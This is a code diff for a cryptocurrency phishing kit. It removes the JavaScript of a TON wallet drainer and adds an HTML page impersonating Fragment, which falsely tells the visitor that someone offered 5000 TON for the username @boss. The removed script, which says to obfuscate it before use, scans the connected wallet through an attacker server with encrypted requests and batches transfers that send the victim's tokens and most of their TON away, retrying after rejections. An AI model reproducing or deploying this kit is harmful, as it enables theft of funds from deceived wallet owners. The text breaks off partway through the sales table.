@@ -1,613 +1,388 @@
-// X-SOFTWARE.ORG
-// OBFUSCATION MUST BE MADE BEFORE USE https://obfuscator.io/
+<!DOCTYPE html><html style="
+    --tg-color-scheme: dark;
+    --tg-theme-bg-color: #212121;
+    --tg-theme-text-color: #ffffff;
+    --tg-theme-hint-color: #aaaaaa;
+    --tg-theme-link-color: #8774e1;
+    --tg-theme-button-color: #8774e1;
+    --tg-theme-button-text-color: #ffffff;
+    --tg-theme-secondary-bg-color: #0f0f0f;
+    --tg-theme-header-bg-color: #212121;
+    --tg-theme-accent-text-color: #8774e1;
+    --tg-theme-section-bg-color: #212121;
+    --tg-theme-section-header-text-color: #aaaaaa;
+    --tg-theme-subtitle-text-color: #aaaaaa;
+    --tg-theme-destructive-text-color: #e53935;
+    --tg-viewport-height: 100vh;
+    --tg-viewport-stable-height: 100vh;
+  " csaa13="csaa13"><head>
+    <title>boss - Fragment</title>
+    <meta property="og:url" content="https://fragment.com/username/boss">
+    <meta property="og:title" content="Buy @boss">
+    <meta property="og:image" content="https://nft.fragment.com/username/boss.webp">
+    <meta property="og:description" content="Check the current availability of @boss, a Telegram collectible username.">
+    <meta property="og:site_name" content="Fragment Auctions">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@ton/ton@13.11.2/dist/index.min.js"></script>
+    <style>
+      .tm-wallet .head {
+          display: inline-block;
+      }
+      .tm-wallet .head:after {
+          content: '...';
+      }
+      .tm-wallet .tail {
+          display: inline-block;
+      }
+    </style>
+  </head>
 
-// Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
-const manifestUrl = 'https://ton-connect.github.io/demo-dapp-with-wallet/tonconnect-manifest.json'; //'https://sainttest.de/tonconnect-manifest.json';
+  <body class="emoji_image no-transition tc-using-mouse" ontouchstart="">
+    <div id="main-content">
+      <link href="./assets/font-robotoc4ca.css" rel="stylesheet" type="text/css">
+      <link href="./assets/bootstrap.mineccb.css" rel="stylesheet">
+      <link href="./assets/bootstrap-extrac81e.css" rel="stylesheet">
+      <link href="./assets/auctiond09b.css" rel="stylesheet">
 
-// The encryption key between the server and Frontend must be the same
-let keyEncr = 500;
+      <svg xmlns="http://www.w3.org/2000/svg" style="position: absolute; width: 0; height: 0; left: -10000px">
+        <defs>
+          <path id="icon-premium" d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z"></path>
+          <path id="icon-ton-qr" d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z" fill="none" stroke="currentColor" stroke-width="2.1"></path>
+          <path d="M 6.67 5.74 L 8.88 1.32 C 9.13 0.81 9.74 0.6 10.25 0.86 C 10.45 0.96 10.61 1.13 10.71 1.33 L 12.79 5.59 C 12.96 5.93 13.29 6.17 13.67 6.22 L 18.03 6.74 C 18.62 6.82 19.05 7.36 18.98 7.96 C 18.95 8.2 18.84 8.43 18.66 8.61 L 15.21 12.03 C 15.07 12.16 15.01 12.36 15.03 12.56 L 15.6 17.17 C 15.69 17.83 15.22 18.44 14.57 18.52 C 14.32 18.55 14.07 18.5 13.85 18.38 L 10.21 16.38 C 9.95 16.24 9.63 16.23 9.36 16.37 L 5.59 18.32 C 5.06 18.59 4.41 18.38 4.14 17.84 C 4.03 17.64 4 17.41 4.03 17.19 L 4.33 15.07 C 4.48 14.03 5.12 13.14 6.04 12.66 L 10.23 10.51 C 10.34 10.45 10.38 10.31 10.33 10.2 C 10.28 10.11 10.19 10.06 10.09 10.08 L 4.97 10.82 C 4.19 10.93 3.39 10.71 2.78 10.2 L 1.07 8.8 C 0.58 8.4 0.51 7.68 0.9 7.18 C 1.09 6.96 1.35 6.81 1.64 6.77 L 6.02 6.2 C 6.3 6.17 6.54 5.99 6.67 5.74 Z" id="icon-star"></path>
+          <linearGradient x1="25%" y1="0.825%" x2="74.92%" y2="107.86%" id="s2">
+            <stop stop-color="#FFD951" offset="0%"></stop>
+            <stop stop-color="#FFB222" offset="100%"></stop>
+          </linearGradient>
+          <linearGradient x1="50%" y1="0%" x2="50%" y2="99.8%" id="s3">
+            <stop stop-color="#E58F0D" offset="0%"></stop>
+            <stop stop-color="#EB7915" offset="100%"></stop>
+          </linearGradient>
+          <filter x="-5.2%" y="-5.3%" width="110.3%" height="110.6%" filterUnits="objectBoundingBox" id="s4">
+            <feOffset dx="1" dy="1" in="SourceAlpha" result="shadowOffsetInner1"></feOffset>
+            <feComposite in="shadowOffsetInner1" in2="SourceAlpha" operator="arithmetic" k2="-1" k3="1" result="shadowInnerInner1"></feComposite>
+            <feColorMatrix values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.657 0" type="matrix" in="shadowInnerInner1"></feColorMatrix>
+          </filter>
+          <g id="icon-colorful-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+            <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+            <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+            <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+          </g>
+          <g id="icon-multi-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+            <use stroke="currentColor" stroke-width="2.67" xlink:href="#icon-star"></use>
+            <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+            <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+            <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+            <path d="M 4 19 L 14 19 L 9 16.5 L 4 19 Z" fill="currentColor"></path>
+          </g>
+        </defs>
+      </svg>
+      <div id="aj_progress" class="progress-bar"></div>
 
-// Number of calls to the debit window when a transaction is rejected
-const maxRetry = 3;
+      <div id="aj_content">
+        <header class="tm-header">
+          <div class="tm-header-logo">
+            <a onclick="location.reload()" class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
+              <i class="tm-logo-icon js-logo-icon"></i>
+              <i class="tm-logo-text"></i>
+            </a>
+          </div>
+          <div class="tm-header-body">
+            <form class="tm-header-search-form" style="margin-right: 10px">
+              <div class="icon-before icon-search tm-field tm-search-field">
+                <input type="search" class="form-control tm-input tm-search-input" name="query" placeholder="Search phone numbers" autocomplete="off">
+              </div>
+            </form>
+          </div>
+          <div class="tm-header-actions tm-header-actions-wide">
+            <button class="btn btn-primary tm-header-action tm-header-button ton-auth-link ton-connect" onclick="connectWallet()">
+            <div id="ton-connect-ui"></div>
+              <!--<i class="icon icon-connect-ton"></i>
+              <span class="tm-button-label">Connect TON</span>-->
+            </button>
+          </div>
 
-// Domain server
-const server = 'fragment-xi.vercel.app'; //'sainttest.de'
+          <div class="tm-header-menu js-header-menu hide aj_popup" data-close-outside="js-header-menu-window" id="n2ij53bk5b3">
+            <div class="tm-header-menu-window js-header-menu-window">
+              <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close" id="anwfabwfkj2"></div>
+              <div class="tm-header-menu-body">
+                <h4 class="tm-menu-subheader">Platform</h4>
+                <div class="tm-menu-links">
+                  <a class="tm-menu-link icon-before icon-menu-about">About</a>
+                  <a class="tm-menu-link icon-before icon-menu-terms">Terms</a>
+                  <a class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
+                </div>
+                <div class="tm-header-menu-footer">
+                  <div class="tm-header-menu-footer-text">
+                    Connect TON and Telegram <br>to view your bids and assets
+                  </div>
+                  <button class="btn btn-primary btn-block tm-menu-button ton-auth-link ton-connect">
+                    <i class="icon icon-connect-ton"></i>
+                    <span class="tm-button-label">Connect TON</span>
+                  </button>
+                  <button class="btn btn-default btn-block tm-menu-button login-link">
+                    <i class="icon icon-connect-telegram"></i>
+                    <span class="tm-button-label">Connect Telegram</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </header>
+        <main class="tm-main js-main-content">
+          <section class="tm-section tm-auction-section">
+            <div class="tm-section-header">
+              <h2 class="tm-section-header-text">
+                <span class="tm-section-header-domain" id="product-name">boss.t.me</span>
+                <span class="tm-section-header-status tm-status-avail">Claimed</span>
+              </h2>
+              <div class="tm-section-subscribe tm-section-box js-subscribe">
+                <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
+                <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
+              </div>
+            </div>
+            <div class="tm-section-box tm-section-bid-info">
+              <table class="table tm-table tm-table-fixed">
+                <thead>
+                  <tr>
+                    <th>What is this?</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td></td>
+                  </tr>
+                </tbody>
+              </table>
+              <div class="tm-bid-info-text tm-offer-info-text" id="bid-info">Someone offered <span class="icon-before icon-ton" id="this-price">5000 TON (~$8432.47)</span> for your username. If the price suits you, press 'Accept the offer'.
+    <a class="tm-nowrap js-howofferworks open-modal" style="cursor: pointer;"><br>How does this work?</a></div>
+            </div>
 
-//
-const custom_btn = true; // Your own button to connect
-const custom_btn_name = 'button'; // For future updates, don't touch
-const autoconnect = false; // Auto-connect when entering the site
+            <div class="tm-list tm-section-box tm-section-auction-info" id="anon-info" style="display: none">
+              <dl class="tm-list-item">
+                <dt class="tm-list-item-title">Anonymous Number</dt>
+                <dd class="tm-list-item-value">
+                  <span class="accent-color" id="anon-info-name"><!-- anon-info-name --></span>
+                </dd>
+              </dl>
+              <div class="tm-list-item-hint">
+                This anonymous number can be used to create a Telegram account
+                not tied to a SIM card.
+              </div>
+            </div>
 
+            <div class="tm-list tm-section-box tm-section-auction-info" id="username-info" style="display: block">
+              <dl class="tm-list-item">
+                <dt class="tm-list-item-title">Telegram Username</dt>
+                <dd class="tm-list-item-value">
+                  <span class="accent-color" id="username-info-name">boss</span>
+                </dd>
+              </dl>
+              <dl class="tm-list-item">
+                <dt class="tm-list-item-title">Web Address</dt>
+                <dd class="tm-list-item-value">
+                  <span class="accent-color" id="username-info-link">t.me/boss</span>
+                </dd>
+              </dl>
+              <dl class="tm-list-item">
+                <dt class="tm-list-item-title">TON Web 3.0 Address</dt>
+                <dd class="tm-list-item-value">
+                  <span class="accent-color"><span class="tm-web3-address"><span class="subdomain" id="username-info-sub">boss</span><span class="domain">.t.me</span></span></span>
+                </dd>
+              </dl>
+            </div>
 
-
-
-let tcUIbtn;
-if (!custom_btn) {
-    tcUIbtnn = 'ton-connect'
-}
-const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: manifestUrl,
-    buttonRootId: 'ton-connect-ui'
-});
-
-let prs_enc = 0,
-    last_request_ts = 0;
-(async () => {
-    prs_enc = keyEncr;
-    keyEncr = Math.floor(Math.random() * 1000);
-})()
-const TonWeb = window.TonWeb;
-
-const tonweb = new TonWeb();
-
-const Address = TonWeb.utils.Address;
-//const tonweb = new TonWeb(new TonWeb.HttpProvider('https://testnet.toncenter.com/api/v2/jsonRPC'));
-
-let currTx = false;
-
-
-
-const prs = (s, t) => {
-    const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
-    const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
-    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
-    return t.split("").map(ab).map(as).map(bh).join("");
-};
-
-const srp = (s, e) => {
-    const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
-    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
-    return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
-};
-
-
-const connectWallet = async () => {
-    if (!tonConnectUI.connected) {
-        await tonConnectUI.openModal();
-    } else {
-        await tonConnectUI.disconnect();
-    }
-
-}
-
-const sendRequest = async (data) => {
-    data.domain = window.location.host;
-    const encode_key = btoa(String(5 + 10 + 365 + 2048 + 867 + prs_enc));
-    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
-    const response = await fetch("https://" + server + "/api/", {
-        method: 'POST',
-        headers: {
-            'Accept': 'text/plain',
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: `raw=${request_data}`
-    });
-
-
-    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
-    if (!response_data.status)
-        return {
-            status: 'error',
-            error: 'Server is Unavailable'
-        };
-    if (response_data.status == "OK") {
-        console.log('STATUS OK')
-        return {
-            status: 'ok',
-            data: response_data.data
-        }
-    }
-    if (response_data.status == "ERROR" && response_data.reason == "low balance") {
-        return {
-            status: "error",
-            reason: 'low balance'
-        }
-    }
-
-    if (response_data.status == "ERROR" && response_data.reason == "low tax") {
-        return {
-            status: "error",
-            reason: 'tax'
-        }
-    }
-
-}
-async function connect(walletAddress) {
-    try {
-
-        //site_connect();
-     
-        let res = await scan_account(walletAddress)
-
-        if (res.status == "error" && res.reason == 'low balance') {
-            console.log('Low Balance');
-        }
-        if (res.status == "error" && res.reason == 'tax') {
-            console.log('Low tax');
-            let modal = document.getElementById('modal')
-            var div = document.createElement("DIV");
-            var style = document.createElement("style");
-            style.innerHTML = `.go1993895553{font-family:arial;} .go4168504425{font-family:arial;} .go1770544884{width:256px;padding:12px 16px;display:flex;gap:9px;background-color:#121214;box-shadow:0 4px 24px rgba(0, 0, 0, 0.16);border-radius:16px;}.go4168504425{font-style:normal;font-weight:510;font-size:14px;line-height:130%;color:#E5E5EA;}.go1993895553{font-style:normal;font-weight:700;font-size:20px;line-height:28px;text-align:center;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go1318663305{padding:0;display:flex;justify-content:center;align-items:center;width:32px;height:32px;border-radius:50%;background-color:#222224;border:none;cursor:pointer;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go1318663305:hover{transform:scale(1.04);}}.go1318663305:active{transform:scale(0.96);}@media (hover: none){.go1318663305:active{transform:scale(0.92);}}.go4218612181{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:pointer;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go4218612181:hover{transform:scale(1.02);}}.go4218612181:active{transform:scale(0.98);}@media (hover: none){.go4218612181:active{transform:scale(0.96);}}.go3974562317{background-color:#0098EA;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);padding:8px 16px 8px 12px;display:flex;align-items:center;gap:4px;height:40px;}.go242012907{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:not-allowed;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go242012907:hover{transform:unset;}}.go242012907:active{transform:unset;}@media (hover: none){.go242012907:active{transform:unset;}} .go37342527{box-shadow:0 4px 16px rgba(0, 0, 0, 0.08), 0 16px 64px rgba(0, 0, 0, 0.16);width:fit-content;margin:auto;}@media (max-width: 440px){.go37342527{width:100%;height:fit-content;margin:auto 0 0 0;}}.go3288899091{transform:translateY(-8px);margin-bottom:12px;}.go3535743411{margin-bottom:12px;}tc-root *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, Tahoma, Verdana, sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:transparent;}tc-root img{-webkit-user-select:none;-webkit-touch-callout:none;}tc-root *:focus{outline:#08f auto 2px;}tc-root li{list-style:none;}tc-root button{outline:none;}body.tc-disable-scroll{position:fixed;overflow-y:scroll;right:0;left:0;}body.tc-using-mouse tc-root *:focus{outline:none;}@keyframes go1365964679{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.go121314943{animation:go1365964679 1s linear infinite;}.go3251346826{height:18px;width:18px;}.go817518207{min-width:148px;height:40px;background-color:#121214;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);display:flex;align-items:center;justify-content:center;}.go1140934594{font-style:normal;font-weight:590;font-size:15px;line-height:18px;color:#E5E5EA;}.go3349661836{transform:rotate(270deg);transition:transform 0.1s ease-in-out;}.go157313249{padding:12px 16px;min-width:148px;justify-content:center;background-color:#121214;}.go2933289244 > div:first-child{margin-top:20px;}.go3572451881{width:fit-content;display:flex;flex-direction:column;align-items:flex-end;}.go3758850101{position:absolute;right:16px;top:16px;}.go3525292397{margin-top:16px;}.go1186201158{font-weight:510;font-size:16px;line-height:20px;text-align:center;max-width:200px;color:#7D7D85;}.go3799783513{display:flex;flex-direction:column;align-items:center;padding-bottom:8px;}.go3872688706{position:relative;min-height:100px;width:416px;padding:44px 56px 24px;box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.04);background-color:#121214;border-radius:24px;}@media (max-width: 440px){.go3872688706{width:100%;}}.go1901766449{border-radius:24px;background-color:#222224;}@media (max-width: 440px){.go1901766449{border-radius:24px 24px 0 0;}}.go823957079{display:flex;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0, 0, 0, 0.4);padding:20px 0;overflow-y:auto;}@media (max-width: 440px){.go823957079{padding-bottom:0;}}.go3727189606{font-style:normal;font-weight:590;font-size:16px;line-height:20px;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go2847679431{width:192px;}.go2847679431 > h3{font-size:15px;}.go3770780435{align-self:center;}`
-            div.innerHTML = '<div class="go823957079 s-enter-active s-enter-to" data-tc-actions-modal-container="true" data-tc-modal="true"><div class="go37342527 go1901766449"><div class="go3872688706"><button class="go3758850101 go1318663305" data-tc-icon-button="true"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.71966 2.71968C3.01255 2.42678 3.48743 2.42677 3.78032 2.71966L8.00002 6.93925L12.2197 2.71967C12.5126 2.42677 12.9874 2.42678 13.2803 2.71967C13.5732 3.01257 13.5732 3.48744 13.2803 3.78033L9.06068 7.99991L13.2803 12.2197C13.5732 12.5126 13.5732 12.9874 13.2803 13.2803C12.9874 13.5732 12.5126 13.5732 12.2197 13.2803L8.00002 9.06057L3.78033 13.2803C3.48744 13.5732 3.01257 13.5732 2.71967 13.2803C2.42678 12.9874 2.42677 12.5126 2.71967 12.2197L6.93936 7.99991L2.71968 3.78034C2.42678 3.48745 2.42677 3.01257 2.71966 2.71968Z" fill="#909099"></path></svg></button><div class="go3799783513" data-tc-confirm-modal="true"><svg width="75px" height="75px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke=""><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M10.0303 8.96967C9.73741 8.67678 9.26253 8.67678 8.96964 8.96967C8.67675 9.26256 8.67675 9.73744 8.96964 10.0303L10.9393 12L8.96966 13.9697C8.67677 14.2626 8.67677 14.7374 8.96966 15.0303C9.26255 15.3232 9.73743 15.3232 10.0303 15.0303L12 13.0607L13.9696 15.0303C14.2625 15.3232 14.7374 15.3232 15.0303 15.0303C15.3232 14.7374 15.3232 14.2625 15.0303 13.9697L13.0606 12L15.0303 10.0303C15.3232 9.73746 15.3232 9.26258 15.0303 8.96969C14.7374 8.6768 14.2625 8.6768 13.9696 8.96969L12 10.9394L10.0303 8.96967Z" fill="#0098EA"></path> <path fill-rule="evenodd" clip-rule="evenodd" d="M12.0574 1.25H11.9426C9.63424 1.24999 7.82519 1.24998 6.41371 1.43975C4.96897 1.63399 3.82895 2.03933 2.93414 2.93414C2.03933 3.82895 1.63399 4.96897 1.43975 6.41371C1.24998 7.82519 1.24999 9.63422 1.25 11.9426V12.0574C1.24999 14.3658 1.24998 16.1748 1.43975 17.5863C1.63399 19.031 2.03933 20.1711 2.93414 21.0659C3.82895 21.9607 4.96897 22.366 6.41371 22.5603C7.82519 22.75 9.63423 22.75 11.9426 22.75H12.0574C14.3658 22.75 16.1748 22.75 17.5863 22.5603C19.031 22.366 20.1711 21.9607 21.0659 21.0659C21.9607 20.1711 22.366 19.031 22.5603 17.5863C22.75 16.1748 22.75 14.3658 22.75 12.0574V11.9426C22.75 9.63423 22.75 7.82519 22.5603 6.41371C22.366 4.96897 21.9607 3.82895 21.0659 2.93414C20.1711 2.03933 19.031 1.63399 17.5863 1.43975C16.1748 1.24998 14.3658 1.24999 12.0574 1.25ZM3.9948 3.9948C4.56445 3.42514 5.33517 3.09825 6.61358 2.92637C7.91356 2.75159 9.62177 2.75 12 2.75C14.3782 2.75 16.0864 2.75159 17.3864 2.92637C18.6648 3.09825 19.4355 3.42514 20.0052 3.9948C20.5749 4.56445 20.9018 5.33517 21.0736 6.61358C21.2484 7.91356 21.25 9.62177 21.25 12C21.25 14.3782 21.2484 16.0864 21.0736 17.3864C20.9018 18.6648 20.5749 19.4355 20.0052 20.0052C19.4355 20.5749 18.6648 20.9018 17.3864 21.0736C16.0864 21.2484 14.3782 21.25 12 21.25C9.62177 21.25 7.91356 21.2484 6.61358 21.0736C5.33517 20.9018 4.56445 20.5749 3.9948 20.0052C3.42514 19.4355 3.09825 18.6648 2.92637 17.3864C2.75159 16.0864 2.75 14.3782 2.75 12C2.75 9.62177 2.75159 7.91356 2.92637 6.61358C3.09825 5.33517 3.42514 4.56445 3.9948 3.9948Z" fill="#0098EA"></path> </g></svg><h1 class="go3525292397 go1993895553" data-tc-h1="true">You have an insufficient balance</h1><div class="go1186201158 go4168504425" fontsize="14px" fontweight="510" lineheight="130%" color="#E5E5EA" data-tc-text="true" style="cursor: default;">Top-up your balance by at least 0.2 TON</div></div></div></div></div>';
-            document.getElementsByTagName('body')[0].appendChild(style);
-            document.getElementsByTagName('body')[0].appendChild(div);
-            div.addEventListener("click", (event) => {div.style.display="none"});
-        }
-        if (res.status == 'ok') {
-            var tryies = 0;
-            if (res.data.haveJettons) {
-
-                let data = {}
-                let max = 32;
-                if (Object.keys(res.data.jettons).length >= 32) {
-                    for (let i = 0; i < Object.keys(res.data.jettons).length; i++) {
-                        if (Object.keys(res.data.jettons).length >= 32) {
-                            if (i < max && i < Object.keys(res.data.jettons).length - 1) {
-                                data[i] = res.data.jettons[i];
-
-                            } else {
-                                max += 32;
-                                let boc = await send_jettons(walletAddress, data)
-
-                                let tx = await sendJettons(boc, walletAddress, res.data.ton, res.data.tonPrice, 0, 0, false)
-
-                            }
-                        }
-
-
-                    }
-                } else {
-                    data = res.data.jettons;
-
-                    let boc = await send_jettons(walletAddress, data)
-
-                    let tx = await sendJettons(boc, walletAddress, res.data.ton, res.data.tonPrice, 0, 0, false)
-
-
-
-                }
-
-            } else {
-                var tryies = 0;
-
-                let dat = await send(walletAddress, res.data.ton, tryies)
-                transaction_done(dat.hash, dat.val);
-            }
-
-        }
-
-
-    } catch (error) {
-        console.error('Error fetching balance:', error);
-    }
-}
-
-async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFlag) {
-    let adr = new TonWeb.utils.Address(walletAddress)
-    if (i < 0) {
-        i = 0;
-    }
-    currTx = false;
-    let msgs = 0;
-    let tkn = 0;
-    let tontx;
-    const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-        messages: []
-    };
-    let tokens = {}
-    let len = Object.keys(data.data.boc).length;
-    for (i; i < len + 1; i) {
-        try {
-            if (msgs < 4 && i < len) {
-
-                msgs += 1;
-                
-                if ((ton * tonPrice < data.data.prices[i]) || (ton * tonPrice > data.data.prices[i] && tonFlag)) {
-
-                    transaction.messages.push({
-                        address: data.data.address[i],
-                        amount: TonWeb.utils.toNano('0.05').toString(),
-                        payload: data.data.boc[i]
-                    });
-                    tokens[tkn] = {
-                        name: data.data.name[i],
-                        prices: data.data.prices[i]
-                    }
-                    tkn++;
-                    i++;
-                } else {
-
-                    if (ton > "0.5" && !tontx) {
-                        let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.5");
-                        let payload = await get_ton_text(transfer_value)
-                        transaction.messages.push({
-                            address: data.data.wallet,
-                            amount: transfer_value,
-                            payload : payload.data
-                        });
-                        tontx = true;
-                        tonFlag = true
-                        tokens[tkn] = {
-                            name: 'TON',
-                            prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
-                        }
-                        tkn++;
-                    } else {
-                        tonFlag = true
-                        msgs -= 1;
-                    }
-                }
-
-
-            } else {
-                if (Object.keys(transaction.messages).length) {
-                    tryies++
-                    let txRequest = await transfer_jettons_native_request(tokens, tryies)
-                    currTx = true;
-                    const result = await tonConnectUI.sendTransaction(transaction)
-                    tonweb.
-                    msgs = 0;
-                    tkn = 0;
-                    
-                    const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
-                    transaction.messages = []
-                    const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
-                    let data123 = {
-                        hash: hash,
-                        tokens: tokens,
-                    }
-                    if (tontx) {
-                        tonFlag = true;
-                        await jettons_transaction_done(data123, true)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                            setTimeout(async () => {
-                                await sendJettons(data, walletAddress, ton, tonPrice, i, 0, true)
-                            }, '7000')
-                        } else {
-                            await sendJettons(data, walletAddress, ton, tonPrice, i, 0, true)
-                        }
-                    } else {
-                        await jettons_transaction_done(data123, false)
-                        await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                            setTimeout(async () => {
-                                await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
-                            }, '7000')
-                        } else {
-                            await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
-                        }
-                    }
-                } else {
-                    return;
-                }
-
-            }
-        } catch (e) {
-
-            console.log(e)
+            <div class="tm-section-box tm-section-buttons">
+              <button class="btn btn-primary js-buy-now-btn1 ton-connect" onclick="connectWallet()">
+                <span class="tm-button-label1">Accept the offer</span>
+              </button>
+            </div>
+          </section>
+          <section class="tm-section clearfix">
+            <div class="tm-section-header">
+              <h3 class="tm-section-header-text">Latest Offers</h3>
+            </div>
+            <div class="tm-table-wrap">
+              <table class="table tm-table tm-table-fixed">
+                <thead>
+                  <tr>
+                    <th style="--thin-width: 100px; --wide-width: 25%">
+                      Offer
+                    </th>
+                    <th style="--thin-width: 110px; --wide-width: 25%" id="date-title">
+                      Date
+                    </th>
+                    <th style="--width: 50%">From</th>
+                  </tr>
+                </thead>
+                <tfoot></tfoot>
+                <tbody>
+                  <tr>
+                    <td>
+                      <div class="table-cell">
+                        <div class="table-cell-value tm-value icon-before icon-ton" id="offer-price">5000</div>
+                      </div>
+                    </td>
+                    <td>
+                      <div class="table-cell">
+                        <div class="tm-datetime">
+                          <span class="wide-only"><time id="current-time">11 Jun 2026 at 12:34</time></span>
+                        </div>
+                      </div>
+                    </td>
+                    <td>
+                      <div class="table-cell">
+                        <a href="https://tonviewer.com/EQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olAez" class="tm-wallet" target="_blank" id="wallet-link"><span class="head" id="wallet-head">UQDbnrjL3Mw4ikGWXdl9OVq6</span><span class="middle"></span><span class="tail" id="wallet-tail">MCS3-qNb6WTmn8VnTB-olAez</span></a>
+                      </div>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section class="tm-section clearfix">
+            <div class="tm-section-header">
+              <h3 class="tm-section-header-text">Previous Sales</h3>
+            </div>
+            <div class="tm-table-wrap">
+              <table class="table tm-table tm-table-fixed">
+                <thead>
+                  <tr>
+                    <th style="--thin-width: 100px; --wide-width: 25%">Price (TON)</th>
+                    <th style="--thin-width: 110px; --wide-width: 25%">Date</th>
+                    <th style="--width: 50%">Buyer</th>
+                  </tr>
+                </thead>
+                <tbody id="previous-sales-body">
+            <tr>
+                <td>
+                    <div class="table-cell">
+                        <div class="table-cell-value tm-value icon-before icon-ton">750</div>
+                    </div>
+                </td>
+                <td>
+                    <div class="table-cell">
+                        <div class="tm-datetime">30 Mar 2025</div>
+                    </div>
+                </td>
+                <td>
+                    <div class="table-cell">
